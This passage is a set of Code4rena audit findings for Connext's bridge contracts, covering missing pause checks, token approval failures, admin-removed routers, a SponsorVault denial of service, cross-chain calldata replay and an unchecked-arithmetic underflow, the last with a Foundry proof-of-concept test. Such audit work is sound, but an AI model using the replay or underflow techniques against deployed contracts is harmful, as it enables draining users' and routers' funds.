functions contain the `whenNotPaused` modifier while `swapExactOut()` and `addSwapLiquidity()` do not. All functions to swap and add liquidity should contain the same modifiers to stop transactions while paused.   ## Proof of Concept ***Example with modifier*** ```   function swapExact(     bytes32 canonicalId,     uint256 amountIn,     address assetIn,     address assetOut,     uint256 minAmountOut,     uint256 deadline   ) external payable nonReentrant deadlineCheck(deadline) whenNotPaused returns (uint256) { ```  ***Examples without modifier*** ```   function swapExactOut(     bytes32 canonicalId,     uint256 amountOut,     address assetIn,     address assetOut,     uint256 maxAmountIn,     uint256 deadline   ) external payable nonReentrant deadlineCheck(deadline) returns (uint256) { ```  and  ```   function addSwapLiquidity(     bytes32 canonicalId,     uint256[] calldata amounts,     uint256 minToMint,     uint256 deadline   ) external nonReentrant deadlineCheck(deadline) returns (uint256) {     return s.swapStorages[canonicalId].addLiquidity(amounts, minToMint);   } ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps Add the `whenNotPaused` modifier to all functions that perform swaps or liquidity additions.  "}, {"title": "Did Not Approve To Zero First Causing Certain Token Transfer To Fail", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/154", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L984 https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/libraries/AssetLogic.sol#L347   # Vulnerability details  ## Proof-of-Concept  Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. For example Tether (USDT)'s `approve()` function will revert if the current approval is not zero, to protect against front-running changes of approvals.  #### Instance 1 - `BridgeFacet._reconcileProcessPortal`  The following function must be approved by zero first, and then the ` SafeERC20.safeIncreaseAllowance` function can be called. Otherwise, the `_reconcileProcessPortal` function will revert everytime it handles such kind of tokens. Understood from the [comment](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L1025) that after the backUnbacked call there could be a remaining allowance.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L984](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L984)  ```solidity   function _reconcileProcessPortal(     uint256 _amount,     address _local,     address _router,     bytes32 _transferId   ) private returns (uint256) {    ..SNIP..     SafeERC20.safeIncreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount);      (bool success, ) = s.aavePool.call(       abi.encodeWithSelector(IAavePool.backUnbacked.selector, adopted, backUnbackedAmount, portalFee)     );    ..SNIP..   } ```  #### Instance 2 - `BridgeFacet_swapAssetOut`  The following fucntion must first be approved by zero, follow by the actual allowance to be approved. Otherwise, the `_swapAssetOut` function will revert everytime it handles such kind of tokens.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/libraries/AssetLogic.sol#L347](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/libraries/AssetLogic.sol#L347)  ```solidity   function _swapAssetOut(     bytes32 _canonicalId,     address _assetIn,     address _assetOut,     uint256 _amountOut,     uint256 _maxIn   )     internal     returns (       bool,       uint256,       address     )   {     AppStorage storage s = LibConnextStorage.connextStorage();      bool success;     uint256 amountIn;      // Swap the asset to the proper local asset     if (stableSwapPoolExist(_canonicalId)) {       // get internal swap pool       SwapUtils.Swap storage ipool = s.swapStorages[_canonicalId];       // if internal swap pool exists       uint8 tokenIndexIn = getTokenIndexFromStableSwapPool(_canonicalId, _assetIn);       uint8 tokenIndexOut = getTokenIndexFromStableSwapPool(_canonicalId, _assetOut);       // calculate slippage before performing swap       // NOTE: this is less efficient then relying on the `swapInternalOut` revert, but makes it easier       // to handle slippage failures (this can be called during reconcile, so must not fail)       if (_maxIn >= ipool.calculateSwapInv(tokenIndexIn, tokenIndexOut, _amountOut)) {         success = true;         amountIn = ipool.swapInternalOut(tokenIndexIn, tokenIndexOut, _amountOut, _maxIn);       }       // slippage is too high to perform swap: success = false, amountIn = 0     } else {       // Otherwise, swap via stable swap pool       IStableSwap pool = s.adoptedToLocalPools[_canonicalId];       uint256 _amountIn = pool.calculateSwapOutFromAddress(_assetIn, _assetOut, _amountOut);       if (_amountIn <= _maxIn) {         // set the success         success = true;          // perform the swap         SafeERC20.safeApprove(IERC20(_assetIn), address(pool), _amountIn);         amountIn = pool.swapExactOut(_amountOut, _assetIn, _assetOut, _maxIn);       }       // slippage is too high to perform swap: success = false, amountIn = 0     }      return (success, amountIn, _assetOut);   } ```  ## Impact  Both the`_reconcileProcessPortal` and `_swapAssetOut` functions are called during repayment to Aave Portal if the fast-transfer was executed using portal liquidity. Thus, it is core part of the token transfer process within Connext, and failure of any of these functions would disrupt the AAVE repayment process.  Since both functions affect the AAVE repayment process, I'm grouping them as one issue.  ## Recommended Mitigation Steps  As Connext bridges/routers deal with all sort of tokens existed in various domains/chains, the protocol should try to implement measure to ensure that it is compatible with as much tokens as possible for future growth and availability of the protocol.  #### Instance 1 - `BridgeFacet._reconcileProcessPortal`  It is recommended to set the allowance to zero before increasing the allowance  ```solidity SafeERC20.safeApprove(IERC20(_assetIn), address(pool), 0); SafeERC20.safeIncreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount); ```  #### Instance 2 - `BridgeFacet_swapAssetOut`  It is recommended to set the allowance to zero before each approve call.  ```solidity SafeERC20.safeApprove(IERC20(_assetIn), address(pool), 0); SafeERC20.safeApprove(IERC20(_assetIn), address(pool), _amountIn); ```  "}, {"title": "Router Owner Could Be Rugged By Admin", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/150", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L293 https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L490 https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L212   # Vulnerability details  ## Proof-of-Concept  Assume that Alice's router has large amount of liquidity inside.  Assume that the Connext Admin decided to remove a router owned by Alice. The Connext Admin will call the `RoutersFacet.removeRouter` function, and all information related to Alice's router will be erased (set to 0x0) from the `s.routerPermissionInfo`.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L293](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L293)  ```solidity   function removeRouter(address router) external onlyOwner {     // Sanity check: not empty     if (router == address(0)) revert RoutersFacet__removeRouter_routerEmpty();      // Sanity check: needs removal     if (!s.routerPermissionInfo.approvedRouters[router]) revert RoutersFacet__removeRouter_notAdded();      // Update mapping     s.routerPermissionInfo.approvedRouters[router] = false;      // Emit event     emit RouterRemoved(router, msg.sender);      // Remove router owner     address _owner = s.routerPermissionInfo.routerOwners[router];     if (_owner != address(0)) {       emit RouterOwnerAccepted(router, _owner, address(0));       // delete routerOwners[router];       s.routerPermissionInfo.routerOwners[router] = address(0);     }      // Remove router recipient     address _recipient = s.routerPermissionInfo.routerRecipients[router];     if (_recipient != address(0)) {       emit RouterRecipientSet(router, _recipient, address(0));       // delete routerRecipients[router];       s.routerPermissionInfo.routerRecipients[router] = address(0);     }      // Clear any proposed ownership changes     s.routerPermissionInfo.proposedRouterOwners[router] = address(0);     s.routerPermissionInfo.proposedRouterTimestamp[router] = 0;   } ```  Alice is aware that her router has been removed by Connext Admin, so she decided to withdraw the liquidity from her previous router by calling `RoutersFacet.removeRouterLiquidityFor`.  However, when Alice called the `RoutersFacet.removeRouterLiquidityFor` function, it will revert every single time. This is because the condition `msg.sender != getRouterOwner(_router)` will always fail.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L490](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L490)  ```solidity   /**    * @notice This is used by any router owner to decrease their available liquidity for a given asset.    * @param _amount - The amount of liquidity to remove for the router    * @param _local - The address of the asset you're removing liquidity from. If removing liquidity of the    * native asset, routers may use `address(0)` or the wrapped asset    * @param _to The address that will receive the liquidity being removed    * @param _router The address of the router    */   function removeRouterLiquidityFor(     uint256 _amount,     address _local,     address payable _to,     address _router   ) external nonReentrant whenNotPaused {     // Caller must be the router owner     if (msg.sender != getRouterOwner(_router)) revert RoutersFacet__removeRouterLiquidityFor_notOwner();      // Remove liquidity     _removeLiquidityForRouter(_amount, _local, _to, _router);   } ```  Since the `RoutersFacet.removeRouter` function has earlier erased all information related to Alice's router within `s.routerPermissionInfo`, the `getRouterOwner` function will always return the router address.  In this case, the router address will not match against `msg.sender` address/Alice address, thus Alice attempts to call `removeRouterLiquidityFor` will always revert.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L212](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/RoutersFacet.sol#L212)  ```solidity   function getRouterOwner(address _router) public view returns (address) {     address _owner = s.routerPermissionInfo.routerOwners[_router];     return _owner == address(0) ? _router : _owner;   } ```  ## Impact  Router owner who provides liquidity could be rugged by Connext admin. When this happen, the router owner funds will be struck  within the `RoutersFacet` contract, and there is no way for the router owner to retrieve their liquidity.  In the worst case scenario, a compromised Connext admin could remove all routers, and cause all liquidity to be struck within `RoutersFacet` and no router owner could withdraw their liquidity from the contract. Next, the `RouterFacet` contract could be upgraded to include additional function to withdraw all liquidity from the contract to an arbitrary wallet address.  ## Recommended Mitigation Steps  The router owner is still entitled to their own liquidity even though their router has been removed by Connext Admin. Thus, they should be given the right to take back their liquidity when such an event happens. The contract should update its implementation to support this. This will give more assurance to the router owner.  "}, {"title": "Single Error Within SponsorVault Contract Could Cause Entire Cross-Chain Communication To Break Down", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/146", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L819](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L819   # Vulnerability details  ## Proof-of-Concept  A third party sponsor would need to implement a `SponsorVault` contract that is aligned with the `ISponsorVault` interface.  Assume that a `SponsorVault` contract has been defined on Optimism chain. All cross-chain communications are required to call the `BridgeFacet.execute`, which in turn will trigger the `BridgeFacet._handleExecuteTransaction` internal function.   However, if there is an error within `SponsorVault` contract in Optimism causing a revert when `s.sponsorVault.reimburseLiquidityFees` or `s.sponsorVault.reimburseRelayerFees` is called, the entire `execute` transaction will revert. Since `execute` transaction always revert, any cross-chain communication between Optimism and other domains will fail.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L819](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L819)  ```solidity   /**    * @notice Process the transfer, and calldata if needed, when calling `execute`    * @dev Need this to prevent stack too deep    */   function _handleExecuteTransaction(     ExecuteArgs calldata _args,     uint256 _amount,     address _asset, // adopted (or local if specified)     bytes32 _transferId,     bool _reconciled   ) private returns (uint256) {     // If the domain if sponsored     if (address(s.sponsorVault) != address(0)) {       // fast liquidity path       if (!_reconciled) {         // Vault will return the amount of the fee they sponsored in the native fee         // NOTE: some considerations here around fee on transfer tokens and ensuring         // there are no malicious `Vaults` that do not transfer the correct amount. Should likely do a         // balance read about it          uint256 starting = IERC20(_asset).balanceOf(address(this));         uint256 sponsored = s.sponsorVault.reimburseLiquidityFees(_asset, _args.amount, _args.params.to);          // Validate correct amounts are transferred         if (IERC20(_asset).balanceOf(address(this)) != starting + sponsored) {           revert BridgeFacet__handleExecuteTransaction_invalidSponsoredAmount();         }          _amount = _amount + sponsored;       }        // Should dust the recipient with the lesser of a vault-defined cap or the converted relayer fee       // If there is no conversion available (i.e. no oracles for origin domain asset <> dest asset pair),       // then the vault should just pay out the configured constant       s.sponsorVault.reimburseRelayerFees(_args.params.originDomain, payable(_args.params.to), _args.params.relayerFee);     }     ..SNIP.. ```  ## Impact  It will result in denial of service. The `SponsorVault` contract, which belongs to a third-party, is a single point of failure for a domain.  ## Recommended Mitigation Steps  This is a problem commonly encountered whenever a method of a smart contract calls another contract \u2013 we cannot rely on the other contract to work 100% of the time, and it is dangerous to assume that the external call will always be successful. Additionally, external smart contract might be vulnerable and compromised by an attacker. Even if the team has audited or review the SponsorVault before whitelisting them, some risk might still exist.  Therefore, it is recommended to implement a fail-safe design where failure of an external call to SponsorVault will not disrupt the cross-chain communication. Consider implementing a try-catch block as shown below. If there is any issue with the external `SponsorVault ` contract, no funds are reimbursed to the users in the worst case scenario, but the issue will not cause any impact to the cross-chain communication.  ```diff function _handleExecuteTransaction(  ExecuteArgs calldata _args,  uint256 _amount,  address _asset, // adopted (or local if specified)  bytes32 _transferId,  bool _reconciled ) private returns (uint256) {  // If the domain if sponsored  if (address(s.sponsorVault) != address(0)) {    // fast liquidity path    if (!_reconciled) {   // Vault will return the amount of the fee they sponsored in the native fee   // NOTE: some considerations here around fee on transfer tokens and ensuring   // there are no malicious `Vaults` that do not transfer the correct amount. Should likely do a   // balance read about it    uint256 starting = IERC20(_asset).balanceOf(address(this)); +  try s.sponsorVault.reimburseLiquidityFees(_asset, _args.amount, _args.params.to) returns (uint256 sponsored) { +   // Validate correct amounts are transferred +   if (IERC20(_asset).balanceOf(address(this)) != starting + sponsored) { +     revert BridgeFacet__handleExecuteTransaction_invalidSponsoredAmount(); +   } + +   _amount = _amount + sponsored; +  } catch {}    }     // Should dust the recipient with the lesser of a vault-defined cap or the converted relayer fee    // If there is no conversion available (i.e. no oracles for origin domain asset <> dest asset pair),    // then the vault should just pay out the configured constant +   try s.sponsorVault.reimburseRelayerFees(_args.params.originDomain, payable(_args.params.to), _args.params.relayerFee) {} catch {}  ..SNIP.. ```  "}, {"title": "Malicious Relayer Can Replay Execute Calldata On Different Chains Causing Double-Spend Issue", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/144", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L411   # Vulnerability details  ## Proof-of-Concept  > This issue is only applicable for fast-transfer. Slow transfer would not have this issue because of the built-in fraud-proof mechanism in Nomad.  First, the attacker will attempt to use Connext to send `1000 USDC` from Ethereum domain to Optimism domain.  Assume that the attacker happens to be a relayer on the relayer network utilised by Connext, and the attacker's relayer happens to be tasked to relay the above execute calldata to the Optimism's Connext [`BridgeFacet.execute`](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L411) function.  Optimism's Connext `BridgeFacet.execute` received the execute calldata and observed within the calldata that it is a fast-transfer and Router A is responsible for providing the liquidity. It will then check that the router signature is valid, and proceed to transfer `1000 oUSDC` to attacker wallet (0x123456) in Optimism.  Next, attacker will update the `ExecuteArgs.local` within the execute calldata to a valid local representation of canonical token (USDC) used within Polygon. Attacker will then send the modified execute calldata to Polygon's Connext `BridgeFacet.execute` function. Assume that the same Router A is also providing liquidity in Polygon. The `BridgeFacet.execute` function checks that the router signature is valid, and proceed to transfer `1000 POS-USDC` to atttack wallet (0x123456) in Polygon.   At this point, the attacker has `1000 oUSDC` and `1000 POS-USDC` in his wallets. When the nomad message arrives at Optimism, Router A can claim the `1000 oUSDC` back from Connext. However, Router A is not able to claim back any fund in Polygon.  Note that same wallet address exists on different chains. For instance, the wallet address on Etherum and Polygon is the same.  ### Why changing the `ExecuteArgs.local` does not affect the router signature verification?  This is because the router signature is generated from the `transferId` + `pathLength` only, and these data are stored within the `CallParams params` within the `ExecuteArgs` struct.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/libraries/LibConnextStorage.sol#L77](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/libraries/LibConnextStorage.sol#L77)  ```solidity struct ExecuteArgs {   CallParams params;   address local; // local representation of canonical token   address[] routers;   bytes[] routerSignatures;   uint256 amount;   uint256 nonce;   address originSender; } ```  Within the [`BridgeFacet._executeSanityChecks`](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L411) function, it will attempt to rebuild to `transferId` by calling the following code:  ```solidity // Derive transfer ID based on given arguments. bytes32 transferId = _getTransferId(_args); ```  Within the [`BridgeFacet._getTransferId`](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L719) function, we can see that the `s.tokenRegistry.getTokenId(_args.local)` will always return the canonical `tokenDomain` and `tokenId`. In our example, it will be `Ethereum` and  `USDC`. Therefore, as long as the attacker specify a valid local representation of canonical token on a chain, the `transferId` returned by `s.tokenRegistry.getTokenId(_args.local)` will always be the same across all domains. Thus, this allows the attacker to modify the `ExecuteArgs.local` and yet he could pass the router signature check.  [https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L719](https://github.com/code-423n4/2022-06-connext/blob/4dd6149748b635f95460d4c3924c7e3fb6716967/contracts/contracts/core/connext/facets/BridgeFacet.sol#L719)  ```solidity   function _getTransferId(ExecuteArgs calldata _args) private view returns (bytes32) {     (uint32 tokenDomain, bytes32 tokenId) = s.tokenRegistry.getTokenId(_args.local);     return _calculateTransferId(_args.params, _args.amount, _args.nonce, tokenId, tokenDomain, _args.originSender);   } ```  ## Impact   Router liquidity would be drained by attacker, and affected router owner could not claim back their liquidity.  ## Recommended Mitigation Steps  The security of the current Connext design depends on how secure or reliable the relayer is. If the relayer turns rouge or act against Connext, many serious consequences can happen.  The root cause is that the current design places enormous trust on the relayers to accurately and reliably to deliver calldata to the bridge in various domains. For instance, delivering of execute call data to `execute` function. There is an attempt to prevent message replay on a single domain, however, it does not prevent message replay across multiple domains. Most importantly, the Connext's bridge appears to have full trust on the calldata delivered by the relayer. However, the fact is that the calldata can always be altered by the relayer.  Consider a classic 0x off-chain ordering book protocol. A user will sign his order with his private key, and attach the signature to the order, and send the order (with signature) to the relayer network. If the relayer attempts to tamper the order message or signature, the decoded address will be different from the signer's address and this will be detected by 0x's Smart contract on-chain when processing the order. This ensures that the integrity of the message and signer can be enforced.  Per good security practice, relayer network should always be considered as a hostile environment/network. Therefore, it is recommended that similar approach could be taken with regards to passing execute calldata across domains/chains.  For instance, at a high level, the sequencer should sign the execute calldata with its private key, and attach the signature to the execute calldata. Then, submit the execute calldata (with signature) to the relayer network. When the bridge receives the execute calldata (with signature), it can verify if the decoded address matches the sequencer address to ensure that the calldata has not been altered. This will ensure the intergrity of the execute calldata and prevent any issue that arise due to unauthorised modification of calldata.  Additionally, the execute calldata should also have a field that correspond to the destination domain. The bridge that receives the execute calldata must verify that the execute calldata is intended for its domain, otherwise reject the calldata if it belongs to other domains. This also helps to prevent the attack mentioned earlier where same execute calldata can be accepted in different domains.  "}, {"title": "Repaying AAVE Loan in `_local` rather than `adopted` asset", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/103", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L80    # Vulnerability details  ## Impact  When repaying the AAVE Portal in [`repayAavePortal()`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L80) the `_local` asset is used to repay the loan in `_backLoan()` rather than the `adopted` asset. This is likely to cause issues in production when actually repaying loans if the asset/token being repayed to AAVE is not the same as the asset/token that was borrowed.  ## Proof of Concept The comment on [`L93`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L93) of [`PortalFacet.sol`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol) states;  ``` // Need to swap into adopted asset or asset that was backing the loan // The router will always be holding collateral in the local asset while the loaned asset // is the adopted asset ```  The swap is executed on [`L98`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L98) in the call to `AssetLogic.swapFromLocalAssetIfNeededForExactOut()` however the return value `adopted` is never used (it's an unused local variable). The full function is shown below;  ``` // Swap for exact `totalRepayAmount` of adopted asset to repay aave (bool success, uint256 amountIn, address adopted) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(   _local,   totalAmount,   _maxIn );  if (!success) revert PortalFacet__repayAavePortal_swapFailed();  // decrement router balances unchecked {   s.routerBalances[msg.sender][_local] -= amountIn; }  // back loan _backLoan(_local, _backingAmount, _feeAmount, _transferId); ``` The balance of the `_local` token is reduced but instead of the `adopted` token being passed to [`_backLoan()`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L112) in L112 the `_local` token is used. ## Tools Used Vim  ## Recommended Mitigation Steps To be consistent with the comments in the [`repayAavePortal()`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L80) function `adopted` should be passed to `_backLoan` so that the loan is repayed in the appropriate token.  Remove the reference to `_local` in the [`_backLoan()`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L112) function and replace it with `adopted` so it reads;  `_backLoan(adopted, _backingAmount, _feeAmount, _transferId);`  "}, {"title": "Incorrect Adopted mapping on updating wrapper token", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/86", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/AssetFacet.sol#L100   # Vulnerability details  ## Issue  1. Admin can call setWrapper function to setup a new wrapper Y instead of old wrapper X  2. This becomes a problem for any old asset which was setup during setupAsset call where s.canonicalToAdopted[_canonical.id]  will still point to old wrapper X instead of Y  ## Recommendation If wrapper is changed then all variables storing this wrapper should also update  "}, {"title": "`PortcalFacet.repayAavePortal()` can trigger an underflow of `routerBalances`", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/68", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/PortalFacet.sol#L80-L113   # Vulnerability details  ## Impact The caller of `repayAavePortal()` can trigger an underflow to arbitrarily increase the caller's balance through an underflow.  ## Proof of Concept ```sol // Relevant code sections:  // PortalFacet.sol   function repayAavePortal(     address _local,     uint256 _backingAmount,     uint256 _feeAmount,     uint256 _maxIn,     bytes32 _transferId   ) external {     uint256 totalAmount = _backingAmount + _feeAmount; // in adopted     uint256 routerBalance = s.routerBalances[msg.sender][_local]; // in local      // Sanity check: has that much to spend     if (routerBalance < _maxIn) revert PortalFacet__repayAavePortal_insufficientFunds();      // Need to swap into adopted asset or asset that was backing the loan     // The router will always be holding collateral in the local asset while the loaned asset     // is the adopted asset      // Swap for exact `totalRepayAmount` of adopted asset to repay aave     (bool success, uint256 amountIn, address adopted) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(       _local,       totalAmount,       _maxIn     );      if (!success) revert PortalFacet__repayAavePortal_swapFailed();      // decrement router balances     unchecked {       s.routerBalances[msg.sender][_local] -= amountIn;     }      // back loan     _backLoan(_local, _backingAmount, _feeAmount, _transferId);   }  // AssetLogic.sol   function swapFromLocalAssetIfNeededForExactOut(     address _asset,     uint256 _amount,     uint256 _maxIn   )     internal     returns (       bool,       uint256,       address     )   {     AppStorage storage s = LibConnextStorage.connextStorage();      // Get the token id     (, bytes32 id) = s.tokenRegistry.getTokenId(_asset);      // If the adopted asset is the local asset, no need to swap     address adopted = s.canonicalToAdopted[id];     if (adopted == _asset) {       return (true, _amount, _asset);     }      return _swapAssetOut(id, _asset, adopted, _amount, _maxIn);   } ``` First, call `repayAavePortal()` where `_backingAmount + _feeAmount > s.routerBalances[msg.sender][_local] && _maxIn > s.routerBalances[msg.sender][_local]`. That will trigger the call to the AssetLogic contract: ```sol     (bool success, uint256 amountIn, address adopted) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(       _local,       totalAmount,       _maxIn     ); ``` By setting `_local` to the same value as the adopted asset, you trigger the following edge case: ```sol     address adopted = s.canonicalToAdopted[id];     if (adopted == _asset) {       return (true, _amount, _asset);     } ``` So the `amountIn` value returned by `swapFromLocalAssetIfNeededForExactOut()` is the `totalAmount` value that was passed to it. And `totalAmount == _backingAmount + _feeAmount`.  Meaning the `amountIn` value is user-specified for this edge case. Finally, we reach the following line: ```sol     unchecked {       s.routerBalances[msg.sender][_local] -= amountIn;     } ``` `amountIn` (user-specified) is subtracted from the `routerBalances` in an `unchecked` block. Thus, the attacker is able to trigger an underflow and increase their balance arbitrarily high. The `repayAavePortal()` function only verifies that `routerBalance < _maxIn`.  Here's a test as PoC: ```sol // PortalFacet.t.sol    function test_PortalFacet_underflow() public {     s.routerPermissionInfo.approvedForPortalRouters[router] = true;      uint backing = 2 ether;     uint fee = 10000;     uint init = 1 ether;      s.routerBalances[router][_local] = init;     s.portalDebt[_id] = backing;     s.portalFeeDebt[_id] = fee;      vm.mockCall(s.aavePool, abi.encodeWithSelector(IAavePool.backUnbacked.selector), abi.encode(true));     vm.prank(router);     this.repayAavePortal(_local, backing, fee, init - 0.5 ether, _id);      // balance > init => underflow     require(s.routerBalances[router][_local] > init);   } ``` ## Tools Used none  ## Recommended Mitigation Steps After the call to `swapFromLocalAssetIfNeededForExactOut()` you should add the following check: ```sol if (_local == adopted) {   require(routerBalance >= amountIn); } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/23", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Equality check with different uint sizes can cause failures \r \r # Lines of code\r \r https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/BridgeFacet.sol#L283\r https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibConnextStorage.sol#L146\r https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibConnextStorage.sol#L41\r \r \r # Vulnerability details\r \r ## Impact\r In `BridgeFacet.sol` the `xcall()` function checks if `_args.params.originDomain != s.domain` and it will revert if these are not equal. The problem is that the `originDomain` is a `uint32` and the `s.domain` is a `uint256`.  This means that if the `s.domain` number is ever larger than the max value for a uint32 value,  this function will fail every time because the `originDomain` could never reach a large enough number. \r \r ## Proof of Concept\r https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/BridgeFacet.sol#L283\r \r https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibConnextStorage.sol#L146\r \r https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibConnextStorage.sol#L41\r \r ## Tools Used\r Manual code review \r \r ## Recommended Mitigation Steps\r The `_args.params.originDomain` and the `s.domain` should both be the same uint type.  They both should be either a uint32 or uint256 to avoid any possible failures due to numbers not being large enough. \r \r "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/13", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Oracle price from DEX can be manipulated\r \r # Lines of code\r \r https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/helpers/ConnextPriceOracle.sol#L99\r \r \r # Vulnerability details\r \r ## Impact\r The [`ConnextPriceOracle.getPriceFromDex`](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/helpers/ConnextPriceOracle.sol#L99) function divides the balances of the two token pairs to compute the price.\r There are several issues with it:\r \r 1. This only returns the *spot price* which can easily be manipulated through flash loans. This is okay if the price oracle contract is only used off-chain\r 2. It only works with specific AMMs like Uniswap that keep both 